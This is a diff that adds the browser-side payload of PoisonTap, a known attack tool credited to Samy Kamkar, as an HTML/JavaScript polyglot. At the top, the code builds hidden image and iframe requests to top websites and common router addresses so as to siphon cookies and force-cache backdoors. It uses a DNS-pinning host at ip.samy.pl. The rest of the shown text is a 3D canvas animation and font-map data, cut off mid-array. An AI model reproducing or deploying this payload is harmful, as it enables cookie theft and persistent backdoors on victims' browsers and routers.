@@ -1,0 +1,3072 @@
+/*
+<!-- PoisonTap by Samy Kamkar -->
+<!-- 01/08/2016 -->
+<!-- https://samy.pl/poisontap -->
+<html><head></head>
+<body>
+
+Welcome to <b><a style="color: #E30B5D" href="https://samy.pl/poisontap">PoisonTap</a></b>, by <a style="color: #E30B5D" href="https://samy.pl">samy kamkar</a>.<p>
+
+
+<script>
+// This entire file can behave as both JS and HTML (note the open-comment at the top to prevent HTML from executing in a JS environment)
+
+// DO NOT DELETE THE '*/' line below //
+// */
+// DO NOT DELETE THE '*/' line above //
+
+// CONFIGURATION
+// Whether we want to use image tags or iframes to
+// exfiltrate cookies and force cache backdoors.
+// Images are faster but may have some caching limitations
+var cacheIframe = 0;
+
+// The dnsPinServer is a special DNS server + hostname
+// that returns the preceding IP (eg, 192.168.0.1.ip.samy.pl -> 192.168.0.1),
+// but also allows temporary wildcard pinning so that
+// 1.2.3.4.PIN.ip.samy.pl causes *.*.*.*.ip.samy.pl
+// to return 1.2.3.4 for a few seconds.
+var dnsPinServer = '.ip.samy.pl';
+
+/* First poison the user's cache of common JS files from CDNs */
+var pre = '';
+
+backdoorRouters();
+
+// Adjust alexa sites to the list from alexa1m.sh -- shortened during testing
+backdoorAlexaSites();
+
+function addIframe(host)
+{
+	var url = 'http://' + host + '/PoisonTap';
+	var iframe = document.createElement('iframe');
+	pre += 'Siphoning cookies & force caching backdoor on ' + url + '<br>';
+	iframe.src = url;
+  //document.body.appendChild(iframe);
+
+  // hide the iframe *after* appending on page to ensure request is made
+  iframe.style.visibility = 'hidden';
+  iframe.style.display = 'none';
+}
+
+function addImg(host)
+{
+	var url = 'http://' + host + '/PoisonTap';
+	var img1 = document.createElement('img');
+	pre += 'Siphoning cookies & force caching backdoor on ' + url + '<br>';
+	img1.src = url;
+
+  // support www. version?
+  //var img2 = document.createElement('img');
+	//img2.src = 'http://www.' + host + '/PoisonTap';
+}
+
+
+// Contact common router IP addresses to cache backdoor onto the router
+function backdoorRouters()
+{
+  // pin the poisontap IP
+  addImg('1.0.0.1.pin.ip.samy.pl'); // this is meant to pin 192.168.0.1 to 1.0.0.1
+
+  var routers = getRouters();
+  for (var i in routers)
+    addIframe(routers[i] + '.ip.samy.pl');
+}
+
+function backdoorAlexaSites()
+{
+  var doms = getDoms();
+
+  /* Now force the user to make HTTP requests to Alexa's top sites, siphon the cookies, and force-cache a backdoor that produces a websocket back to us */
+  for (var i in doms)
+  {
+    // decide whether we cache an img tag or iframe
+    if (cacheIframe)
+      addIframe(doms[i]);
+    else
+      addImg(doms[i]);
+  }
+}
+
+var w = window.parent;
+var d = w.document;
+var divid = '__poisontap';
+if (!d.getElementById(divid))
+{
+  // if you want poisontap to start up immediatele, make sure next line is uncommented
+  ptcanvas();
+
+	var div = d.createElement('div');
+	div.id = divid;
+	var a = d.createElement('a');
+  a.href = 'https://samy.pl';
+  a.target = '_blank';
+/*	a.href = '#';
+	a.onclick = function() {
+		ptcanvas();
+		return false;
+	};
+  */
+  a.style.color = '#E30B5D'; // raspberry-colored pi symbol
+	a.innerHTML = '&#960'; // mm, pi
+  a.style.fontSize = '40px';
+	div.appendChild(a);
+	div.style.position = 'fixed';
+	div.style.bottom = '5px';
+	div.style.right = '10px';
+	d.body.appendChild(div);
+}
+
+function ltext()
+{
+  if (pre.length)
+  {
+	  var l = "";
+	  while (l.indexOf('>') == -1 && pre.length > 0)
+	  {
+		  l += pre.substr(0, 1);
+	  	pre = pre.substr(1);
+	  }
+		document.getElementById('__ptterm').innerHTML += l;
+		setTimeout(ltext, 10); // 10 looks better?
+
+	}
+	return;
+
+  // do letter at a time this way
+	if (pre.length)
+	{
+		var l = pre.substr(0, 1);
+		pre = pre.substr(1);
+		if (l === '<')
+		{
+			while (l.indexOf('>') == -1)
+			{
+				l += pre.substr(0, 1);
+				pre = pre.substr(1);
+			}
+		}
+
+		document.getElementById('__ptterm').innerHTML += l;
+		setTimeout(ltext, 1); // 10 looks better?
+	}
+}
+
+function ptcanvas()
+{
+	var term = d.createElement('div');
+	term.style.backgroundColor = '#000';
+	term.style.color = '#00bfff';
+	term.id = '__ptterm';
+	term.innerHTML = 'Welcome to <b><a href="http://samy.pl/poisontap">PoisonTap</a></b>, by <a href="http://samy.pl">samy kamkar</a>.<p>' //; &#42;&#47;';
+  term.style.width = '100%';
+  term.style.height = '100%';
+  term.style.position = 'fixed';
+  term.style.left = '0px';
+  term.style.top = '0px';
+  term.style.minHeight = '100%';
+  term.style.zIndex = 1;
+  term.style.backgroundColor = 'transparent';
+  term.style.padding = '5px';
+  term.style.fontFamily = 'monospace';
+
+  var canvas = d.createElement('canvas');
+  //var ctx = canvas.getContext("2d");
+  //ctx.globalAlpha = '0.2';
+  canvas.id = 'canvas';
+  canvas.style.position = 'fixed';
+  canvas.style.left = '0px';
+  canvas.style.top = '0px';
+  canvas.style.minHeight = '100%';
+  //canvas.style.width = '100%';
+  //canvas.style.height = '100%';
+
+  //term.appendChild(canvas);
+  d.body.appendChild(canvas);
+  d.body.appendChild(term);
+  ltext();
+
+
+  var _stop = 0;
+  window.onresize = function() {
+    console.log(window.innerWidth)
+      init.size.x = window.innerWidth;
+    init.size.y = window.innerHeight;
+    init.canvas.width = init.size.x;
+    init.canvas.width = init.size.x;
+    camera.display.x = init.size.x/2;
+    camera.display.y = init.size.y/2;
+  };
+  var init = {
+    canvas : new Object(),
+    ctx : new Object(),
+    size : new Object(),
+    nodeStrokeFlag : false,
+    canvasSetup : function() {
+      init.canvas = document.getElementById("canvas");
+      init.size.x = window.innerWidth;
+      init.size.y = window.innerWidth;
+      init.canvas.width = init.size.x;
+      init.canvas.height = init.size.y;
+      init.ctx = init.canvas.getContext("2d");
+    }
+  };
+  init.canvasSetup();
+
+  var dtr = function(d) {return d*Math.PI/180};
+  var ceiling = function(num) {return parseInt(num*10000)/10000};
+
+
+  //polarToRectangle
+  var polarToRectangle =  function(dX, dY, radius) {
+    var x = Math.sinE0(dtr(dX)) * Math.cosE0(dtr(dY)) * radius;
+    var y = Math.sinE0(dtr(dX)) * Math.sinE0(dtr(dY)) * radius;
+    var z = Math.cosE0(dtr(dX)) * radius;
+    return {x:y, y:z, z:x};
+  };
+
+  //rectangleToPolar
+  var rectangleToPolar = function(x, y, z) {
+    if(x == 0)	var xD = 0.001;
+    else		var xD = x;
+    if(y == 0)	var yD = 0.001;
+    else		var yD = y;
+    if(z == 0)	var zD = 0.001;
+    else		var zD = z;
+    var radius = Math.sqrt(xD*xD + yD*yD + zD*zD);
+    var theta = Math.atan(zD / Math.sqrt(xD*xD + yD*yD));
+    var phi = Math.atan(yD / xD);
+    return {x:theta*(180/Math.PI), y:phi*(180/Math.PI), r:radius};
+  };
+
+
+  Math.sinE0 = function(val) {
+    if(val === 0) {
+      return Math.sin(0.000001)
+    } else {
+      return Math.sin(val);
+    };
+  };
+  Math.cosE0 = function(val) {
+    if(val === 0) {
+      return Math.cos(0.000001)
+    } else {
+      return Math.cos(val);
+    };
+  };
+  Math.getVector = function(startVertex, endVertex) {
+    return {
+      x : endVertex.affineOut.x - startVertex.affineOut.x,
+      y : endVertex.affineOut.y - startVertex.affineOut.y,
+      z : endVertex.affineOut.z - startVertex.affineOut.z
+    };
+  };
+  Math.getCross = function(vector1, vector2) {
+    return {
+      x : vector1.y*vector2.z - vector1.z*vector2.y,
+      y : vector1.z*vector2.x - vector1.x*vector2.z,
+      z : vector1.x*vector2.y - vector1.y*vector2.x
+    };
+  };
+  Math.getNormal = function(cross3d) {
+    var length = Math.sqrt(cross3d.x*cross3d.x + cross3d.y*cross3d.y + cross3d.z*cross3d.z);
+    return {
+      x : cross3d.x / length,
+      y : cross3d.y / length,
+      z : cross3d.z / length
+    };
+  };
+  var getNormal = function(vectorSet0, vectorSet1) {
+    var vector1 = Math.getVector(vectorSet0[0],vectorSet0[1]);
+    var vector2 = Math.getVector(vectorSet1[0],vectorSet1[1]);
+    var cross = Math.getCross(vector1, vector2);
+    var normal = Math.getNormal(cross);
+    return normal;
+  };
+
+  Math.getDot = function(vector1, vector2) {
+    return vector1.x*vector2.x + vector1.y*vector2.y + vector1.z*vector2.z;
+  };
+
+
+  var closeValue = function(minTime, maxTime) {
+    this.flag = 0;
+
+    this.progress = 0;
+    this.startTime = 0;
+    this.durationTime = 0;
+
+    this.fromValue = 0;
+    this.toValue = 0;
+    this.smoothFlag = true;
+
+    this.minValue = 0;
+    this.maxValue = 1;
+    this.minDuration = minTime;
+    this.maxDuration = maxTime;
+  };
+  closeValue.prototype = {
+    init : function() {
+      this.durationTime = this.minDuration + (this.maxDuration-this.minDuration) * Math.random();
+      this.startTime = Date.now();
+      this.progress = Math.min(1, ((Date.now()-this.startTime)/this.durationTime));
+      if(this.smoothFlag == true) {
+        this.fromValue = this.toValue;
+      } else {
+        this.fromValue = Math.random();
+      };
+      this.toValue = this.minValue + this.maxValue * Math.random();
+      this.flag = 1;
+      return this.fromValue + (this.toValue - this.fromValue) * this.progress;
+    },
+    update : function() {
+      this.progress = Math.min(1, ((Date.now()-this.startTime)/this.durationTime));
+      if(this.progress== 1) this.flag = 0;
+      return this.fromValue + (this.toValue - this.fromValue) * this.progress;
+    },
+    execution : function() {
+      if(this.flag == 0)		{return this.init()}
+      else if(this.flag == 1)	{return this.update()};
+    }
+  };
+
+  var camera = {
+    focus : 750,
+    self : {
+      x : 0,
+      y : 0,
+      z : 100
+    },
+    rotate : {
+      x : 0,
+      y : 0,
+      z : 0
+    },
+    zoom : 1,
+    display : {
+      x : init.size.x/2,
+      y : init.size.y/2,
+      z : 0
+    },
+    clipPlane : {
+      near : 0,
+      far : 1000
+    },
+    enableCulling : false
+  };
+
+
+  var affine = {
+    world : {
+      size : function(p, size) {
+        return {
+          x :	p.x * size.x,
+          y : p.y * size.y,
+          z : p.z * size.z
+        }
+      },
+      rotate: {
+        x : function(p, rotate) {
+          return {
+            x : p.x,
+            y : p.y*Math.cosE0(dtr(rotate.x)) - p.z*Math.sinE0(dtr(rotate.x)),
+            z : p.y*Math.sinE0(dtr(rotate.x)) + p.z*Math.cosE0(dtr(rotate.x))
+          }
+        },
+        y : function(p, rotate) {
+          return {
+            x : p.x*Math.cosE0(dtr(rotate.y)) + p.z*Math.sinE0(dtr(rotate.y)),
+            y : p.y,
+            z : -p.x*Math.sinE0(dtr(rotate.y)) + p.z*Math.cosE0(dtr(rotate.y))
+          }
+        },
+        z : function(p, rotate) {
+          return {
+            x : p.x*Math.cosE0(dtr(rotate.z)) - p.y*Math.sinE0(dtr(rotate.z)),
+            y : p.x*Math.sinE0(dtr(rotate.z)) + p.y*Math.cosE0(dtr(rotate.z)),
+            z : p.z
+          }
+        }
+      },
+      position : function(p, position) {
+        return {
+          x : p.x + position.x,
+          y : p.y + position.y,
+          z : p.z + position.z
+        }
+      },
+    },
+    view : {
+      point : function(p) {
+        return {
+          x : p.x - camera.self.x,
+          y : p.y - camera.self.y,
+          z : p.z - camera.self.z
+        }
+      },
+      x : function(p) {
+        return {
+          x : p.x,
+          y : p.y*Math.cosE0(dtr(camera.rotate.x)) - p.z*Math.sinE0(dtr(camera.rotate.x)),
+          z : p.y*Math.sinE0(dtr(camera.rotate.x)) + p.z*Math.cosE0(dtr(camera.rotate.x))
+        }
+      },
+      y : function(p) {
+        return {
+          x : p.x*Math.cosE0(dtr(camera.rotate.y)) + p.z*Math.sinE0(dtr(camera.rotate.y)), 
+          y : p.y,
+          z : p.x*-Math.sinE0(dtr(camera.rotate.y)) + p.z*Math.cosE0(dtr(camera.rotate.y))
+        }
+      },
+      viewReset : function(p) {
+        return {
+          x : p.x - camera.self.x,
+          y : p.y - camera.self.y,
+          z : p.z - camera.self.z
+        }
+      },
+      righthandedReversal : function(p) {
+        return {
+          x : p.x,
+          y : -p.y,
+          z : p.z,
+        }
+      }
+    },
+    perspective : function(p) {
+      return {
+        x : p.x * ((camera.focus-camera.self.z) / ((camera.focus-camera.self.z) - p.z)) * camera.zoom,
+        y : p.y * ((camera.focus-camera.self.z) / ((camera.focus-camera.self.z) - p.z)) * camera.zoom,
+        z : p.z * ((camera.focus-camera.self.z) / ((camera.focus-camera.self.z) - p.z)) * camera.zoom,
+        p : ((camera.focus-camera.self.z) / ((camera.focus-camera.self.z) - p.z)) * camera.zoom,
+      }
+    },
+    display : function(p, display) {
+      return {
+        x : p.x + display.x,
+        y : p.y + display.y,
+        z : p.z + display.z,
+        p : p.p,
+      }
+    },
+    process : function(model, size, rotate, position,display) {
+      var ret = affine.world.size(model, size);
+      ret = affine.world.rotate.x(ret, rotate);
+      ret = affine.world.rotate.y(ret, rotate);
+      ret = affine.world.rotate.z(ret, rotate);
+      ret = affine.world.position(ret, position);
+      ret = affine.view.point(ret);
+      ret = affine.view.x(ret);
+      ret = affine.view.y(ret);
+      ret = affine.view.viewReset(ret);
+      ret = affine.view.righthandedReversal(ret);
+      ret = affine.perspective(ret);
+      ret = affine.display(ret, display);
+      return ret;
+    }
+  };
+
+
+  var light = {
+    enableLight : true,
+    ambientLight : {
+      color : {
+        r : 1.0,
+        g : 1.0,
+        b : 1.0
+      },
+      intensity : 0.0
+    },
+    directionalLight : {
+      degree : {
+        x : 0,
+        y : 0,
+        z : 1
+      },
+      color : {
+        r : 1.0,
+        g : 1.0,
+        b : 1.0
+      },
+      intensity : 1.0
+    }
+  };
+
+
+  var vertex3d = function(param) {
+    this.affineIn = new Object;
+    this.affineOut = new Object;
+    this.affineIn.vertex = ({x:0,y:0,z:0} || param.vertex);
+    this.affineIn.size = ({x:1,y:1,z:1} || param.size);
+    this.affineIn.rotate = ({x:0,y:0,z:0,} || param.rotate);
+    this.affineIn.position = ({x:0,y:0,z:0} || param.position);
+  };
+  vertex3d.prototype = {
+    vertexUpdate : function() {
+      this.affineOut = affine.process(
+          this.affineIn.vertex,
+          this.affineIn.size,
+          this.affineIn.rotate,
+          this.affineIn.position,
+          camera.display
+          );
+    }
+  };
+
+
+  var getFace = function(verts) {
+    return {
+      verts : [verts[0], verts[1], verts[2]],
+      normal : getNormal([verts[1],verts[0]], [verts[2],verts[0]]),
+      zIndex : verts[0].affineOut.p + verts[1].affineOut.p + verts[2].affineOut.p
+    };
+  };
+
+
+  var shader = {
+    shadeObject : new Array(),
+    chromaticAberration : {
+      flag : false,
+      r : {x:3, y:0},
+      g : {x:0, y:0},
+      b : {x:-3, y:0}
+    },
+    zSort : function() {
+      shader.shadeObject.sort(
+          function(a, b) {
+            if (a.face.zIndex < b.face.zIndex) return -1;
+            if (a.face.zIndex > b.face.zIndex) return 1;
+            return 0;
+          }
+          );
+    },
+    flatShader : {
+      directionalLighting : function() {
+        if(light.enableLight == true) {
+          for(var i=0; i<shader.shadeObject.length; i++) {
+            var lambertReflectance = Math.getDot(
+                {
+                  x : ceiling(shader.shadeObject[i].face.normal.x),
+                  y : ceiling(shader.shadeObject[i].face.normal.y),
+                  z : ceiling(shader.shadeObject[i].face.normal.z)
+                },
+                {
+                  x : light.directionalLight.degree.x,
+                  y : light.directionalLight.degree.y,
+                  z : light.directionalLight.degree.z
+                }
+                );
+
+            shader.shadeObject[i].fillColor = {
+              r : (light.directionalLight.color.r*lambertReflectance) * ((shader.shadeObject[i].fillColor.r + light.ambientLight.color.r)/2) + light.ambientLight.intensity,
+              g : (light.directionalLight.color.g*lambertReflectance) * ((shader.shadeObject[i].fillColor.g + light.ambientLight.color.g)/2) + light.ambientLight.intensity,
+              b : (light.directionalLight.color.b*lambertReflectance) * ((shader.shadeObject[i].fillColor.b + light.ambientLight.color.b)/2) + light.ambientLight.intensity,
+              a : shader.shadeObject[i].fillColor.a
+            };
+            shader.shadeObject[i].strokeColor = {
+              r : (light.directionalLight.color.r*lambertReflectance) * ((shader.shadeObject[i].strokeColor.r + light.ambientLight.color.r)/2) + light.ambientLight.intensity,
+              g : (light.directionalLight.color.g*lambertReflectance) * ((shader.shadeObject[i].strokeColor.g + light.ambientLight.color.g)/2) + light.ambientLight.intensity,
+              b : (light.directionalLight.color.b*lambertReflectance) * ((shader.shadeObject[i].strokeColor.b + light.ambientLight.color.b)/2) + light.ambientLight.intensity,
+              a : shader.shadeObject[i].strokeColor.a
+            };
+          };
+        };
+      }
+    },
+    fillShade : function(augumentColor) {
+      init.ctx.fillStyle = "rgba("+
+        parseInt(augumentColor.r*255) +","+
+        parseInt(augumentColor.g*255) +","+
+        parseInt(augumentColor.b*255) +","+
+        augumentColor.a +")";
+      init.ctx.fill();
+    },
+    strokeShade : function(augumentColor) {
+      init.ctx.lineWidth = 0.3;
+      init.ctx.strokeStyle = "rgba("+
+        parseInt(augumentColor.r*255) +","+
+        parseInt(augumentColor.g*255) +","+
+        parseInt(augumentColor.b*255) +","+
+        augumentColor.a +")";
+      init.ctx.stroke();
+    },
+    shade : function(color) {
+      for(var i=0; i<shader.shadeObject.length; i++) {
+        if(shader.shadeObject[i].face.normal.z>0 && shader.shadeObject[i].face.zIndex<7&&shader.shadeObject[i].face.zIndex>0) {
+          init.ctx.beginPath();
+          for(var j=0; j<shader.shadeObject[i].face.verts.length; j++) {
+            if(j == 0) {
+              init.ctx.moveTo(shader.shadeObject[i].face.verts[j].affineOut.x, shader.shadeObject[i].face.verts[j].affineOut.y);
+            } else {
+              init.ctx.lineTo(shader.shadeObject[i].face.verts[j].affineOut.x, shader.shadeObject[i].face.verts[j].affineOut.y);
+            };
+          };
+          init.ctx.closePath();
+          switch(color) {
+            case "r":
+              if(shader.shadeObject[i].fill === true) shader.fillShade({r:shader.shadeObject[i].fillColor.r,g:0,b:0,a:shader.shadeObject[i].fillColor.a});
+              if(shader.shadeObject[i].stroke === true) shader.strokeShade({r:shader.shadeObject[i].strokeColor.r,g:0,b:0,a:shader.shadeObject[i].strokeColor.a});
+              break;
+            case "g":
+              if(shader.shadeObject[i].fill === true) shader.fillShade({r:0,g:shader.shadeObject[i].fillColor.g,b:0,a:shader.shadeObject[i].fillColor.a});
+              if(shader.shadeObject[i].stroke === true) shader.strokeShade({r:0,g:shader.shadeObject[i].strokeColor.g,b:0,a:shader.shadeObject[i].strokeColor.a});
+              break;
+            case "b":
+              if(shader.shadeObject[i].fill === true) shader.fillShade({r:0,g:0,b:shader.shadeObject[i].fillColor.b,a:shader.shadeObject[i].fillColor.a});
+              if(shader.shadeObject[i].stroke === true) shader.strokeShade({r:0,g:0,b:shader.shadeObject[i].strokeColor.b,a:shader.shadeObject[i].strokeColor.a});
+              break;
+            default:
+              if(shader.shadeObject[i].fill === true) shader.fillShade(shader.shadeObject[i].fillColor);
+              if(shader.shadeObject[i].stroke === true) shader.strokeShade(shader.shadeObject[i].strokeColor);
+              break;
+          };
+        };
+      };
+    },
+    execution : function() {
+      init.ctx.save();
+      if(shader.chromaticAberration.flag === false) {
+        init.ctx.globalCompositeOperation = "source-over";
+        shader.shade();
+      } else {
+        init.ctx.globalCompositeOperation = "lighter";
+        init.ctx.translate(shader.chromaticAberration.r.x, shader.chromaticAberration.r.y);
+        shader.shade("r");
+        init.ctx.translate(-shader.chromaticAberration.r.x, -shader.chromaticAberration.r.y);
+        init.ctx.translate(shader.chromaticAberration.g.x, shader.chromaticAberration.g.y);
+        shader.shade("g");
+        init.ctx.translate(-shader.chromaticAberration.g.x, -shader.chromaticAberration.g.y);
+        init.ctx.translate(shader.chromaticAberration.b.x, shader.chromaticAberration.b.y);
+        shader.shade("b");
+        init.ctx.translate(-shader.chromaticAberration.b.x, -shader.chromaticAberration.b.y);
+      };
+      init.ctx.restore();
+    }
+  };
+
+  var isoscelesRightTriangle = function(argument) {
+    // base object
+    this.vertices = new Object();
+    this.shadeObjects = new Object();
+
+    // model parameter
+    this.shade = argument.shade;
+    this.fill = argument.fill;
+    this.stroke = argument.stroke;
+    this.fillColor = argument.fillColor;
+    this.strokeColor = argument.strokeColor;
+    this.size = argument.size;
+    this.position = argument.position;
+    this.rotate = argument.rotate;
+
+    this.uniqueFlag001 = false; 
+
+    //model data
+    this.vertexData = {
+      v0 : {x:1, y:1, z:1},
+      v1 : {x:1, y:-1, z:1},
+      v2 : {x:-1, y:-1, z:1},
+      v3 : {x:1, y:-1, z:-1}
+    };
+    this.indexData = {
+      f0 : ["v0", "v1", "v2"],
+      f1 : ["v0", "v3", "v1"],
+      f2 : ["v0", "v2", "v3"],
+      f3 : ["v1", "v3", "v2"]
+    };
+    // vertices init
+    for(i in this.vertexData) {
+      this.vertices[i] = new vertex3d({
+        position : this.position,
+        vertex : {x:this.vertexData[i].x*this.size, y:this.vertexData[i].y*this.size, z:this.vertexData[i].z*this.size}
+      });
+      this.vertices[i].vertexUpdate();
+    };
+    // shadeObjects init
+    for(var i in this.indexData) {
+      this.shadeObjects[i] = new Object;
+      this.shadeObjects[i].face = new Object;
+      this.shadeObjects[i].fill = this.fill;
+      this.shadeObjects[i].stroke = this.stroke;
+      this.shadeObjects[i].fillColor = this.fillColor;
+      this.shadeObjects[i].strokeColor = this.strokeColor;
+    };
+  };
+  isoscelesRightTriangle.prototype = {
+    controll : function(argument) {
+      this.shade = argument.shade;
+      if(this.shade === true) {
+        this.fill = argument.fill;
+        this.stroke = argument.stroke;
+
+        if(argument.size) {
+          this.size = argument.size;
+        };
+        if(argument.fillColor) {
+          this.fillColor = {
+            r : argument.fillColor.r,
+            g : argument.fillColor.g,
+            b : argument.fillColor.b,
+            a : argument.fillColor.a
+          };
+        };
+        if(argument.strokeColor) {
+          this.strokeColor = {
+            r : argument.strokeColor.r,
+            g : argument.strokeColor.g,
+            b : argument.strokeColor.b,
+            a : argument.strokeColor.a
+          };
+        };
+        if(argument.position) {
+          this.position = {
+            x : argument.position.x,
+            y : argument.position.y,
+            z : argument.position.z
+          };
+        };
+        if(argument.rotate) { 
+          this.rotate = {
+            x : argument.rotate.x,
+            y : argument.rotate.y,
+            z : argument.rotate.z
+          };
+        };
+      };
+    },
+    update : function() {
+      if(this.shade === true) {
+        for(var i in this.vertexData) {
+          if(this.uniqueFlag001 == false) {
+            this.vertices[i].affineIn.vertex = {
+              x : this.vertexData[i].x*this.size,
+              y : this.vertexData[i].y*this.size,
+              z : this.vertexData[i].z*this.size,
+            };
+          } else {
+            this.vertices[i].affineIn.vertex = {
+              x : this.vertexData[i].x*this.size * (0.8*Math.random()+0.5),
+              y : this.vertexData[i].y*this.size * (0.8*Math.random()+0.5),
+              z : this.vertexData[i].z*this.size * (0.8*Math.random()+0.5),
+            };
+          };
+          this.vertices[i].affineIn.position = {
+            x : this.position.x,
+            y : this.position.y,
+            z : this.position.z
+          };
+          this.vertices[i].affineIn.rotate = {
+            x : this.rotate.x,
+            y : this.rotate.y,
+            z : this.rotate.z
+          };
+          this.vertices[i].vertexUpdate();
+        };
+        for(var i in this.indexData) {
+          this.shadeObjects[i].face = getFace([this.vertices[this.indexData[i][0]], this.vertices[this.indexData[i][1]], this.vertices[this.indexData[i][2]]]);
+          this.shadeObjects[i].fill = this.fill;
+          this.shadeObjects[i].stroke = this.stroke;
+          this.shadeObjects[i].fillColor = this.fillColor;
+          this.shadeObjects[i].strokeColor = this.strokeColor;
+        };
+      };
+    },
+    addShader : function() {
+      if(this.shade === true) {
+        for(var i in this.shadeObjects) {
+          shader.shadeObject.push(this.shadeObjects[i]);
+        };
+      };
+    }
+  };
+
+  var DEFIINE_instanceNum = 2100;
+  var instanceObject = new Array();
+  var objectInit = function() {
+    for(var i=0; i<DEFIINE_instanceNum; i++) {
+      instanceObject[i] = new isoscelesRightTriangle({
+        shade : false,
+        fill : false,
+        stroke : false,
+        color: {r:0.0, g:0.0, b:0.0, a:0.0},
+        fillColor: {r:0.0, g:0.0, b:0.0, a:0.0},
+        strokeColor: {r:0.0, g:0.0, b:0.0, a:0.0},
+        size: 0,
+        position: {x:2000*Math.random()-1000, y:2000*Math.random()-1000, z:2000*Math.random()-1000},
+        rotate: {x:720*Math.random()-360, y:720*Math.random()-360, z:720*Math.random()-360}
+      });
+    };
+  };
+  var objectUpdate = function() {
+    for(var i=0; i<instanceObject.length; i++){
+      if(instanceObject[i]) {
+        instanceObject[i].controll({
+          shade : controll.value[i].shade,
+          fill : controll.value[i].fill,
+          stroke : controll.value[i].stroke,
+          color: controll.value[i].color,
+          fillColor : controll.value[i].fillColor,
+          strokeColor : controll.value[i].strokeColor,
+          size: controll.value[i].size,
+          position: controll.value[i].position,
+          rotate: controll.value[i].rotate
+        });
+        instanceObject[i].update();
+        instanceObject[i].addShader();
+      };
+    };
+  };
+
+  var freemap_disconnected = function() {
+    this.returnData = new Array();
+    for(var i=0; i<DEFIINE_instanceNum; i++) {
+      this.returnData[i] = {
+        shade : false,
+        fill : false,
+        stroke : false,
+        fillColor: {r:1.0, g:1.0, b:1.0, a:1.0},
+        strokeColor: {r:1.0, g:1.0, b:1.0, a:1.0},
+        size: 0,
+        position: {x:Math.random()*1000-500, y:Math.random()*1000-500, z:Math.random()*1000-500},
+        rotate: {x:Math.random()*1000-500, y:Math.random()*1000-500, z:Math.random()*1000-500}
+      };
+    };
+
+    return this.returnData;
+  };
+
+
+  var freemap_random = function() {
+    this.returnData = new Array();
+    for(var i=0; i<DEFIINE_instanceNum; i++) {
+      this.returnData[i] = {
+        shade : false,
+        fill : false,
+        stroke : false,
+        fillColor: {r:1.0, g:1.0, b:1.0, a:1.0},
+        strokeColor: {r:1.0, g:1.0, b:1.0, a:1.0},
+        size: Math.random()*2,
+        position: {x:Math.random()*1500-750, y:Math.random()*1500-750, z:Math.random()*1500-750},
+        rotate: {x:Math.random()*720-360, y:Math.random()*720-360, z:Math.random()*720-360}
+      };
+    };
+    for(var i=0; i<100; i++) {
+      this.returnData[i].shade = true;
+      this.returnData[i].fill = true;
+    };
+
+    return this.returnData;
+  };
+
+
+
+  var fontmap_fullchara = function() {
+    this.returnData = new Array();
+    this.col = 130;
+    this.row = 150;
+    this.cellLength = 18;
+    this.cellSpace = 18;
+    for(var i=0; i<DEFIINE_instanceNum; i++) {
+      this.returnData[i] = {
+        shade : false,
+        fill : false,
+        stroke : false,
+        fillColor: {r:1.0, g:1.0, b:1.0, a:1.0},
+        strokeColor: {r:1.0, g:1.0, b:1.0, a:1.0},
+        size: 0,
+        position: {x:0, y:0, z:0},
+        rotate: {x:0, y:0, z:0}
+      };
+    };
+    this.fontMapData = [
+    {//A
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*-2, y:this.row*3, z:0}, 
+      map : [[0,0,0,2,0],[0,0,2,5,0],[0,2,1,1,0],[0,1,3,5,0],[0,1,0,1,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+    {//B
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*-1, y:this.row*3, z:0}, 
+      map : [[0,4,0,0,0],[0,3,3,4,0],[0,5,3,1,0],[0,5,2,1,0],[0,3,1,0,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+    {//C
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*0, y:this.row*3, z:0}, 
+      map : [[0,0,4,0,0],[0,2,1,4,0],[0,1,0,0,0],[0,3,4,1,0],[0,0,3,0,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+    {//D
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*1, y:this.row*3, z:0}, 
+      map : [[0,4,0,0,0],[0,3,3,4,0],[0,5,0,5,0],[0,5,2,1,0],[0,1,1,0,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+    {//E
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*2, y:this.row*3, z:0}, 
+      map : [[0,0,2,1,0],[0,2,1,0,0],[0,2,2,1,0],[0,5,0,2,0],[0,1,3,1,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+
+    {//F
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*-2, y:this.row*2, z:0}, 
+      map : [[0,0,2,1,0],[0,2,1,0,0],[0,2,2,1,0],[0,5,0,0,0],[0,1,0,0,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+    {//G
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*-1, y:this.row*2, z:0}, 
+      map : [[0,0,2,0,0],[0,2,1,0,0],[0,1,0,4,0],[0,3,2,1,0],[0,0,3,0,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+    {//H
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*0, y:this.row*2, z:0}, 
+      map : [[0,4,0,2,0],[0,5,0,1,0],[0,2,1,5,0],[0,5,0,5,0],[0,1,0,3,0]] ,  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+    {//I
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*1, y:this.row*2, z:0}, 
+      map : [[0,0,2,0,0],[0,0,2,0,0],[0,0,5,0,0],[0,0,5,0,0],[0,0,1,0,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+    {//J
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*2, y:this.row*2, z:0}, 
+      map : [[0,0,0,2,0],[0,0,0,5,0],[0,0,0,5,0],[0,4,2,1,0],[0,0,1,0,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+
+    {//K
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*-2, y:this.row*1, z:0}, 
+      map : [[0,4,0,0,0],[0,4,0,2,0],[0,5,2,1,0],[0,5,0,4,0],[0,1,0,3,0]] ,  
